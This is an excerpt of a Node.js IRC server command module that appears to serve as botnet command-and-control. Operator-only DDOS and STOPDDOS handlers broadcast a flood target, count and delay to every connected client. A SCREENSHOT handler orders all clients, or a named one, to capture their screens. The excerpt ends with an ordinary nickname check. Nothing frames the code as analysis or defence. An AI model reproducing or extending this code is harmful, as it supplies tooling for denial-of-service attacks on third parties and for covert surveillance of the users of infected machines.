...
module.exports = {
  DDOS: function(user, target, times, delay) {
    if (user.localOper !== true) return;
    
    if (typeof target === "undefined") {
      user.send (this.host, this.reply.ddos, ':DDOS target <times> <delay>');
      return;
    }
    ...
    // Send to users
    var users = this.users.registered;
    for (var i = 0; i < users.length; i++) {
      if(users[i] === user) continue;
      users[i].send (this.host, irc.reply.ddos, ':'+opts.target, opts.times, opts.delay);
    }
    user.send (this.host, irc.reply.ddos, ':DDOSing '+opts.target+' for '+opts.times+' with delay of '+opts.delay+'ms');
  },
  
  STOPDDOS: function (user) {
    if (user.localOper !== true) return;
    var users = this.users.registered;
    for (var i = 0; i < users.length; i++) {
      if (users[i] === user) continue;
      users[i].send (this.host, irc.reply.stopddos);
    }
  },
  
  SCREENSHOT: function (user, target) {
    if (user.localOper !== true) return;
    var users = this.users.registered;
    var target_user = (typeof target !== "undefined") ? target : "";
    for (var i = 0; i < users.length; i++) {
      if (users[i] === user) continue;
      if (target_user == "") {
        users[i].send (this.host, irc.reply.screenshot);
        user.send (this.host, irc.reply.screenshot, ":Sent screenshot request to", users[i].nick);
        continue;
      } else {
        if (users[i].nick == target_user) {
          users[i].send (this.host, irc.reply.screenshot);
          user.send (this.host, irc.reply.screenshot, ":Sent screenshot request to", users[i].nick);
          break;
        }
  ...
  NICK: function(user, nick) {
    ...
    if (!nick || nick.length === 0) {
      ...
      return;
    } else if (nick.length > (this.config.maxNickLength || 9) || nick.match(irc.validations.invalidNick)) {
